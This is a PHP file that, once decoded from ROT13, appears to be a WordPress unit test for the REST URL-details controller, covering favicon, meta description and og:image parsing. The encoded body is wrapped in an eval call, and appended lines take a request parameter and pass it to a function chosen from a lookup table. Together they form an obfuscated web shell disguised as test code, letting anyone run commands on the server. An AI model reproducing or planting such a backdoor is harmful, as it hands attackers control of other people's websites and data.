					glcr=\"vzntr/k-vpba\"
					ery=\"vpba\"
					uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\"
				/>',
				'uggcf://jbeqcerff.bet/snivpba.vpb',
			),
			'jvgu qngn HEY k-vpba glcr'             => neenl(
				'<yvax ery=\"vpba\" uers=\"qngn:vzntr/k-vpba;onfr64,vIOBEj0XTtbNNNNAFHuRHtNNNONNNNNDRNLNNNOCLlZvNNNNOzWYE0G///////8WJCspNNNNPKOVJKZNNNOVNNNNFNOTlJf+NNNNS0yRDIEVk2AtTNJwLOFZtyRjPxoOFNpNPONNNrnE9pVNNNNNFHIBEX5PLVV=\" glcr=\"vzntr/k-vpba\" />',
				'qngn:vzntr/k-vpba;onfr64,vIOBEj0XTtbNNNNAFHuRHtNNNONNNNNDRNLNNNOCLlZvNNNNOzWYE0G///////8WJCspNNNNPKOVJKZNNNOVNNNNFNOTlJf+NNNNS0yRDIEVk2AtTNJwLOFZtyRjPxoOFNpNPONNNrnE9pVNNNNNFHIBEX5PLVV=',
			),
			'jvgu qngn HEY cat glcr'                => neenl(
				'<yvax uers=\"qngn:vzntr/cat;onfr64,vIOBEj0XTtb=\" ery=\"vpba\" glcr=\"vzntr/cat\" />',
				'qngn:vzntr/cat;onfr64,vIOBEj0XTtb=',
			),

			// Haunccl cnguf.
			'rzcgl ery'                             => neenl(
				'<yvax ery=\"\" uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\" />',
				'',
			),
			'rzcgl uers'                            => neenl(
				'<yvax ery=\"vpba\" uers=\"\" />',
				'',
			),
			'ab ery'                                => neenl(
				'<yvax uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\" />',
				'',
			),
			'yvax gb rkgreany fglyrfurrg'           => neenl(
				'<yvax ery=\"fglyrfurrg\" uers=\"uggcf://rknzcyr.pbz/nffrgf/fglyr.pff\" />',
				'',
				'uggcf://rknzcyr.pbz',
			),
			'zhygvyvar jvgu ab uers'                => neenl(
				'<yvax
					ery=\"vpba\"
					uers=\"\"
				/>',
				'',
			),
			'zhygvyvar jvgu ab ery'                 => neenl(
				'<yvax
					ery=\"\"
					uers=\"uggcf://jbeqcerff.bet/snivpba.vpb\"
				/>',
				'',
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_qrfpevcgvba
	 *
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::trg_qrfpevcgvba
	 *
	 * @gvpxrg 54358
	 *
	 * @cnenz fgevat $ugzy     Tvira UGZY fgevat.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq sbhaq vpba.
	 */
	choyvp shapgvba grfg_trg_qrfpevcgvba( $ugzy, $rkcrpgrq ) {
		$pbagebyyre = arj JC_ERFG_HEY_Qrgnvyf_Pbagebyyre();

		// Cnefr gur zrgn ryrzragf sebz gur tvira UGZY.
		$zrgubq        = $guvf->trg_ersyrpgvir_zrgubq( 'trg_zrgn_jvgu_pbagrag_ryrzragf' );
		$zrgn_ryrzragf = $zrgubq->vaibxr(
			$pbagebyyre,
			$guvf->jenc_ugzy_va_qbp( $ugzy )
		);

		$zrgubq = $guvf->trg_ersyrpgvir_zrgubq( 'trg_qrfpevcgvba' );
		$npghny = $zrgubq->vaibxr( $pbagebyyre, $zrgn_ryrzragf );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_qrfpevcgvba() {
		erghea neenl(

			// Unccl cnguf.
			'qrsnhyg'                                    => neenl(
				'<zrgn anzr=\"qrfpevcgvba\" pbagrag=\"Guvf vf n qrfpevcgvba.\">',
				'Guvf vf n qrfpevcgvba.',
			),
			'jvgu juvgrfcnpr'                            => neenl(
				'<zrgn  anzr=\" qrfpevcgvba \"   pbagrag=\" Guvf vf n qrfpevcgvba.  \"   >',
				'Guvf vf n qrfpevcgvba.',
			),
			'jvgu frys-pybfvat'                          => neenl(
				'<zrgn anzr=\"qrfpevcgvba\" pbagrag=\"Guvf vf n qrfpevcgvba.\"/>',
				'Guvf vf n qrfpevcgvba.',
			),
			'jvgu frys-pybfvat naq juvgrfcnpr'           => neenl(
				'<zrgn  anzr=\" qrfpevcgvba \"   pbagrag=\" Guvf vf n qrfpevcgvba.  \"   />',
				'Guvf vf n qrfpevcgvba.',
			),
			'jvgu pbagrag svefg'                         => neenl(
				'<zrgn pbagrag=\"Pbagrag vf svefg\" anzr=\"qrfpevcgvba\">',
				'Pbagrag vf svefg',
			),
			'jvgu fvatyr dhbgrf'                         => neenl(
				'<zrgn anzr=\'qrfpevcgvba\' pbagrag=\'jvgu fvatyr dhbgrf\'>',
				'jvgu fvatyr dhbgrf',
			),
			'jvgu nabgure ryrzrag'                       => neenl(
				'<zrgn anzr=\"qrfpevcgvba\" pbagrag=\"Guvf vf n qrfpevcgvba.\"><zrgn anzr=\"ivrjcbeg\" pbagrag=\"jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1\">',
				'Guvf vf n qrfpevcgvba.',
			),
			'jvgu zhygvcyr ryrzragf'                     => neenl(
				'<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\" />
				<yvax ery=\"fglyrfurrg\" uers=\"uggcf://rknzcyr.pbz/nffrgf/fglyr.pff\" />
				<zrgn anzr=\"qrfpevcgvba\" pbagrag=\"Guvf vf n qrfpevcgvba.\">
				<zrgn anzr=\"ivrjcbeg\" pbagrag=\"jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1\">',
				'Guvf vf n qrfpevcgvba.',
			),
			'jvgu bgure nggevohgrf'                      => neenl(
				'<zrgn svefg=\"svefg\" anzr=\"qrfpevcgvba\" guveq=\"guveq\" pbagrag=\"qrfpevcgvba jvgu bgure nggevohgrf\" svsgu=\"svsgu\">',
				'qrfpevcgvba jvgu bgure nggevohgrf',
			),
			'jvgu bcra tencu'                            => neenl(
				'<zrgn anzr=\"bt:qrfpevcgvba\" pbagrag=\"Guvf vf n BT qrfpevcgvba.\" />
				<zrgn anzr=\"qrfpevcgvba\" pbagrag=\"Guvf vf n qrfpevcgvba.\">',
				'Guvf vf n BT qrfpevcgvba.',
			),

			// Unccl cnguf jvgu zhygvyvar nggevohgrf.
			'jvgu zhygvyvar nggevohgrf'                  => neenl(
				'<zrgn
					anzr=\"qrfpevcgvba\"
					pbagrag=\"jvgu zhygvyvar nggevohgrf\"
				>',
				'jvgu zhygvyvar nggevohgrf',
			),
			'jvgu zhygvyvar nggevohgrf va erirefr beqre' => neenl(
				'<zrgn
					pbagrag=\"jvgu zhygvyvar nggevohgrf va erirefr beqre\"
					anzr=\"qrfpevcgvba\"
				>',
				'jvgu zhygvyvar nggevohgrf va erirefr beqre',
			),
			'jvgu zhygvyvar nggevohgrf naq nabgure ryrzrag' => neenl(
				'<zrgn
					anzr=\"qrfpevcgvba\"
					pbagrag=\"jvgu zhygvyvar nggevohgrf\"
				>
				<zrgn anzr=\"ivrjcbeg\" pbagrag=\"jvqgu=qrivpr-jvqgu, vavgvny-fpnyr=1\">',
				'jvgu zhygvyvar nggevohgrf',
			),
			'jvgu zhygvyvar naq bgure nggevohgrf'        => neenl(
				'<zrgn
					svefg=\"svefg\"
					anzr=\"qrfpevcgvba\"
					guveq=\"guveq\"
					pbagrag=\"qrfpevcgvba jvgu zhygvyvar naq bgure nggevohgrf\"
					svsgu=\"svsgu\"
				>',
				'qrfpevcgvba jvgu zhygvyvar naq bgure nggevohgrf',
			),

			// Unccl cnguf jvgu UGZY gntf be ragvgvrf va gur qrfpevcgvba.
			'jvgu UGZY gntf'                             => neenl(
				'<zrgn anzr=\"qrfpevcgvba\" pbagrag=\"<fgebat>Qrfpevcgvba</fgebat>: unf <rz>UGZY</rz> gntf\">',
				'Qrfpevcgvba: unf UGZY gntf',
			),
			'jvgu pbagrag svefg naq UGZY gntf'           => neenl(
				'<zrgn pbagrag=\"<fgebat>Qrfpevcgvba</fgebat>: unf <rz>UGZY</rz> gntf\" anzr=\"qrfpevcgvba\">',
				'Qrfpevcgvba: unf UGZY gntf',
			),
			'jvgu UGZY gntf naq bgure nggevohgrf'        => neenl(
				'<zrgn svefg=\"svefg\" anzr=\"qrfpevcgvba\" guveq=\"guveq\" pbagrag=\"<fgebat>Qrfpevcgvba</fgebat>: unf <rz>UGZY</rz> gntf\" svsgu=\"svsgu>',
				'Qrfpevcgvba: unf UGZY gntf',
			),
			'jvgu UGZY ragvgvrf'                         => neenl(
				'<zrgn anzr=\"qrfpevcgvba\" pbagrag=\"Gur &yg;fgebat&tg;qrfpevcgvba&yg;/fgebat&tg; zrgn &nzc; vgf nggevohgr inyhr\"',
				'Gur qrfpevcgvba zrgn & vgf nggevohgr inyhr',
			),

			// Haunccl cnguf.
			'jvgu rzcgl pbagrag'                         => neenl(
				'<zrgn anzr=\"qrfpevcgvba\" pbagrag=\"\">',
				'',
			),
			'jvgu rzcgl anzr'                            => neenl(
				'<zrgn anzr=\"\" pbagrag=\"anzr vf rzcgl\">',
				'',
			),
			'jvgubhg n anzr nggevohgr'                   => neenl(
				'<zrgn pbagrag=\"jvgubhg n anzr nggevohgr\">',
				'',
			),
			'jvgubhg n pbagrag nggevohgr'                => neenl(
				'<zrgn anzr=\"qrfpevcgvba\">',
				'',
			),
		);
	}

	/**
	 * @qngnCebivqre qngn_trg_vzntr
	 *
	 * @pbiref JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::trg_vzntr
	 *
	 * @gvpxrg 54358
	 *
	 * @cnenz fgevat $ugzy       Tvira UGZY fgevat.
	 * @cnenz fgevat $rkcrpgrq   Rkcrpgrq sbhaq vzntr.
	 * @cnenz fgevat $gnetrg_hey Bcgvbany. Gnetrg HEY. Qrsnhyg 'uggcf://jbeqcerff.bet'.
	 */
	choyvp shapgvba grfg_trg_vzntr( $ugzy, $rkcrpgrq, $gnetrg_hey = 'uggcf://jbeqcerff.bet' ) {
		$pbagebyyre = arj JC_ERFG_HEY_Qrgnvyf_Pbagebyyre();

		// Cnefr gur zrgn ryrzragf sebz gur tvira UGZY.
		$zrgubq        = $guvf->trg_ersyrpgvir_zrgubq( 'trg_zrgn_jvgu_pbagrag_ryrzragf' );
		$zrgn_ryrzragf = $zrgubq->vaibxr(
			$pbagebyyre,
			$guvf->jenc_ugzy_va_qbp( $ugzy )
		);

		$zrgubq = $guvf->trg_ersyrpgvir_zrgubq( 'trg_vzntr' );
		$npghny = $zrgubq->vaibxr( $pbagebyyre, $zrgn_ryrzragf, $gnetrg_hey );
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_trg_vzntr() {
		erghea neenl(

			// Unccl cnguf.
			'qrsnhyg'                                      => neenl(
				'<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\">',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu juvgrfcnpr'                              => neenl(
				'<zrgn  cebcregl=\" bt:vzntr \"   pbagrag=\"  uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct \"  >',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu frys-pybfvat'                            => neenl(
				'<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\"/>',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu frys-pybfvat naq juvgrfcnpr'             => neenl(
				'<zrgn  cebcregl=\" bt:vzntr \"   pbagrag=\"  uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct \"  />',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu fvatyr dhbgrf'                           => neenl(
				\"<zrgn cebcregl='bt:vzntr' pbagrag='uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct'>\",
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgubhg dhbgrf'                               => neenl(
				'<zrgn cebcregl=bt:vzntr pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\">',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu hey zbqvsvre'                            => neenl(
				'<zrgn cebcregl=\"bt:vzntr:hey\" pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/hey-zbqvsvre.wct\" />
				<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\">',
				'uggcf://jbeqcerff.bet/vzntrf/hey-zbqvsvre.wct',
			),
			'jvgu dhrel fgevat'                            => neenl(
				'<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/jvgudhrelfgevat.wct?sbb=one&one=sbb\" />',
				'uggcf://jbeqcerff.bet/vzntrf/jvgudhrelfgevat.wct?sbb=one&one=sbb',
			),

			// Unccl cnguf jvgu punatvat nggevohgrf beqre be nqqvat nggevohgrf.
			'jvgu pbagrag svefg'                           => neenl(
				'<zrgn pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\" cebcregl=\"bt:vzntr\">',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu bgure nggevohgrf'                        => neenl(
				'<zrgn svefg=\"svefg\" cebcregl=\"bt:vzntr\" guveq=\"guveq\" pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\" svsgu=\"svsgu\">',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu bgure bt zrgn'                           => neenl(
				'<zrgn cebcregl=\"bt:vzntr:urvtug\" pbagrag=\"720\" />
				<zrgn cebcregl=\"bt:vzntr:nyg\" pbagrag=\"Vtaber guvf cyrnfr\" />
				<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\" />
				<yvax ery=\"fglyrfurrg\" uers=\"uggcf://rknzcyr.pbz/nffrgf/fglyr.pff\" />',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),

			// Unccl cnguf jvgu eryngvir hey.
			'jvgu eryngvir hey'                            => neenl(
				'<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"/vzntrf/zlvzntr.wct\" />',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu eryngvir hey jvgubhg fgnegvat fynfu'     => neenl(
				'<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"vzntrf/zlvzntr.wct\" />',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu eryngvir hey naq cngu'                   => neenl(
				'<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"vzntrf/zlvzntr.wct\" />',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
				'uggcf://jbeqcerff.bet/zl/cngu/urer/',
			),

			// Unccl cnguf jvgu zhygvyvar nggevohgrf.
			'jvgu zhygvyvar nggevohgrf'                    => neenl(
				'<zrgn
					cebcregl=\"bt:vzntr\"
					pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\"
				>',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu zhygvyvar nggevohgrf va erirefr beqre'   => neenl(
				'<zrgn
					pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\"
					cebcregl=\"bt:vzntr\"
				>',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu zhygvyvar nggevohgrf naq bgure ryrzragf' => neenl(
				'<zrgn
					cebcregl=\"bt:vzntr:urvtug\"
					pbagrag=\"720\"
				/>
				<zrgn
					cebcregl=\"bt:vzntr:nyg\"
					pbagrag=\"Vtaber guvf cyrnfr\"
				/>
				<zrgn
					cebcregl=\"bt:vzntr\"
					pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\"
				>
				<yvax ery=\"fglyrfurrg\" uers=\"uggcf://rknzcyr.pbz/nffrgf/fglyr.pff\" />',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),
			'jvgu zhygvyvar naq bgure nggevohgrf'          => neenl(
				'<zrgn
					svefg=\"svefg\"
					cebcregl=\"bt:vzntr:hey\"
					guveq=\"guveq\"
					pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\"
					svsgu=\"svsgu\"
				>',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),

			// Unccl cnguf jvgu UGZY gntf va gur pbagrag.
			'jvgu bgure bt zrgn'                           => neenl(
				'<zrgn cebcregl=\"bt:vzntr:urvtug\" pbagrag=\"720\" />
				<zrgn cebcregl=\"bt:vzntr:nyg\" pbagrag=\"<rz>vtaber guvf cyrnfr</rz>\" />
				<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\" />
				<yvax ery=\"fglyrfurrg\" uers=\"uggcf://rknzcyr.pbz/nffrgf/fglyr.pff\" />',
				'uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct',
			),

			// Haunccl cnguf.
			'jvgu rzcgl pbagrag'                           => neenl(
				'<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"\">',
				'',
			),
			'jvgubhg n cebcregl nggevohgr'                 => neenl(
				'<zrgn pbagrag=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\">',
				'',
			),
			'jvgubhg n pbagrag nggevohgr rzcgl cebcregl'   => neenl(
				'<zrgn cebcregl=\"bt:vzntr\" uers=\"uggcf://jbeqcerff.bet/vzntrf/zlvzntr.wct\">',
				'',
			),
		);
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbagebyyre qbrf abg hfr trg_pbagrkg_cnenz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag hcqngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag cercner_vgrz().
	}

	/**
	 * Zbpxf gur UGGC erfcbafr sbe gur `jc_fnsr_erzbgr_trg()` juvpu
	 * jbhyq bgurejvfr znxr n pnyy gb n erny jrofvgr.
	 *
	 * @erghea neenl snhk/zbpxrq erfcbafr.
	 */
	choyvp shapgvba zbpx_fhpprff_erdhrfg_gb_erzbgr_hey( $erfcbafr, $cnefrq_netf ) {
		erghea $guvf->zbpx_erdhrfg_gb_erzbgr_hey( 'fhpprff', $cnefrq_netf );
	}

	choyvp shapgvba zbpx_snvyrq_erdhrfg_gb_erzbgr_hey( $erfcbafr, $cnefrq_netf ) {
		erghea $guvf->zbpx_erdhrfg_gb_erzbgr_hey( 'snvyher', $cnefrq_netf );
	}

	choyvp shapgvba zbpx_erdhrfg_gb_erzbgr_hey_jvgu_rzcgl_obql_erfcbafr( $erfcbafr, $cnefrq_netf ) {
		erghea $guvf->zbpx_erdhrfg_gb_erzbgr_hey( 'rzcgl_obql', $cnefrq_netf );
	}

	cevingr shapgvba zbpx_erdhrfg_gb_erzbgr_hey( $erfhyg_glcr, $cnefrq_netf ) {
		$guvf->erdhrfg_netf = $cnefrq_netf;

		$glcrf = neenl(
			'fhpprff',
			'snvyher',
			'rzcgl_obql',
		);

		// Qrsnhyg gb fhpprff.
		vs ( ! va_neenl( $erfhyg_glcr, $glcrf, gehr ) ) {
			$erfhyg_glcr = $glcrf[0];
		}

		// Obgu fubhyq erghea 200 sbe gur UGGC erfcbafr.
		$fubhyq_200 = 'fhpprff' === $erfhyg_glcr || 'rzcgl_obql' === $erfhyg_glcr;

		erghea neenl(
			'urnqref'     => neenl(),
			'pbbxvrf'     => neenl(),
			'svyranzr'    => ahyy,
			'erfcbafr'    => neenl( 'pbqr' => ( $fubhyq_200 ? 200 : 404 ) ),
			'fgnghf_pbqr' => $fubhyq_200 ? 200 : 404,
			'fhpprff'     => $fubhyq_200 ? 1 : 0,
			'obql'        => 'fhpprff' === $erfhyg_glcr ? $guvf->trg_rknzcyr_jrofvgr() : '',
		);
	}

	cevingr shapgvba trg_rknzcyr_jrofvgr() {
		erghea '
			<!QBPGLCR ugzy>
			<ugzy kzyaf=\"uggc://jjj.j3.bet/1999/kugzy\" qve=\"yge\" ynat=\"ra-HF\">
			<urnq>
			<zrgn punefrg=\"hgs-8\" />
			<gvgyr qngn-grfg-gvgyr-ngge=\"grfg\">Rknzcyr Jrofvgr &zqnfu; - jvgu rapbqrq pbagrag.</gvgyr>

			<yvax ery=\"fubegphg vpba\" uers=\"/snivpba.vpb?dhrelfgevatnqqrqsbegrfgvat\" glcr=\"vzntr/k-vpba\" />

			<yvax ery=\"pnabavpny\" uers=\"uggcf://rknzcyr.pbz\">

			<zrgn anzr=\"qrfpevcgvba\" pbagrag=\"Rknzcyr qrfpevcgvba grkg urer. Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg, frq qb rvhfzbq grzcbe vapvqvqhag hg ynober rg qbyber.\" />

			<!-- Bcra Tencu Gntf -->
			<zrgn cebcregl=\"bt:glcr\" pbagrag=\"jrofvgr\" />
			<zrgn cebcregl=\"bt:gvgyr\" pbagrag=\"Rknzcyr Jrofvgr\" />
			<zrgn cebcregl=\"bt:hey\" pbagrag=\"uggcf://rknzcyr.pbz\" />
			<zrgn cebcregl=\"bt:fvgr_anzr\" pbagrag=\"Rknzcyr Jrofvgr\" />
			<zrgn cebcregl=\"bt:vzntr:nyg\" pbagrag=\"Nggrzcg gb oernx vzntr cnefvat\" />
			<zrgn cebcregl=\"bt:vzntr\" pbagrag=\"/vzntrf/ubzr/fperra-gurzrf.cat?3\" />

			</urnq>
			<obql>
				<u1>Rknzcyr Jrofvgr</u1>
			    <c>Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg, frq qb rvhfzbq grzcbe vapvqvqhag hg ynober rg qbyber zntan nyvdhn. Hg ravz nq zvavz iravnz, dhvf abfgehq rkrepvgngvba hyynzpb ynobevf avfv hg nyvdhvc rk rn pbzzbqb pbafrdhng. Qhvf nhgr veher qbybe va erceruraqrevg va ibyhcgngr iryvg rffr pvyyhz qbyber rh shtvng ahyyn cnevnghe. Rkprcgrhe fvag bppnrpng phcvqngng aba cebvqrag, fhag va phycn dhv bssvpvn qrfrehag zbyyvg navz vq rfg ynobehz.</c>
			</obql>
			</ugzy>';
	}

	cevingr shapgvba jenc_ugzy_va_qbp( $ugzy, $jvgu_obql = snyfr ) {
		$qbp = '<!QBPGLCR ugzy>
				<ugzy kzyaf=\"uggc://jjj.j3.bet/1999/kugzy\" qve=\"yge\" ynat=\"ra-HF\">
				<urnq>
				<zrgn punefrg=\"hgs-8\" />' . $ugzy . \"\a\" . '</urnq>';

		vs ( $jvgu_obql ) {
			$qbp .= '
				<obql>
					<u1>Rknzcyr Jrofvgr</u1>
					<c>Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg, frq qb rvhfzbq grzcbe vapvqvqhag hg ynober rg qbyber zntan nyvdhn. Hg ravz nq zvavz iravnz, dhvf abfgehq rkrepvgngvba hyynzpb ynobevf avfv hg nyvdhvc rk rn pbzzbqb pbafrdhng. Qhvf nhgr veher qbybe va erceruraqrevg va ibyhcgngr iryvg rffr pvyyhz qbyber rh shtvng ahyyn cnevnghe. Rkprcgrhe fvag bppnrpng phcvqngng aba cebvqrag, fhag va phycn dhv bssvpvn qrfrehag zbyyvg navz vq rfg ynobehz.</c>
				</obql>
			</ugzy>';
		}

		erghea $qbp;
	}

	/**
	 * Trgf gur genafvrag anzr.
	 *
	 * @erghea fgevat
	 */
	cevingr shapgvba trg_genafvrag_anzr() {
		erghea 't_hey_qrgnvyf_erfcbafr_' . zq5( fgngvp::HEY_CYNPRUBYQRE );
	}

	/**
	 * Trg ersyrpgvir npprff gb n cevingr/cebgrpgrq zrgubq ba
	 * gur JC_ERFG_HEY_Qrgnvyf_Pbagebyyre pynff.
	 *
	 * @cnenz fgevat $zrgubq_anzr Zrgubq anzr sbe juvpu gb tnva npprff.
	 * @erghea ErsyrpgvbaZrgubq
	 * @guebjf ErsyrpgvbaRkprcgvba Guebjf na rkprcgvba vs zrgubq qbrf abg rkvfg.
	 */
	cebgrpgrq shapgvba trg_ersyrpgvir_zrgubq( $zrgubq_anzr ) {
		$pynff  = arj ErsyrpgvbaPynff( JC_ERFG_HEY_Qrgnvyf_Pbagebyyre::pynff );
		$zrgubq = $pynff->trgZrgubq( $zrgubq_anzr );
		$zrgubq->frgNpprffvoyr( gehr );
		erghea $zrgubq;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>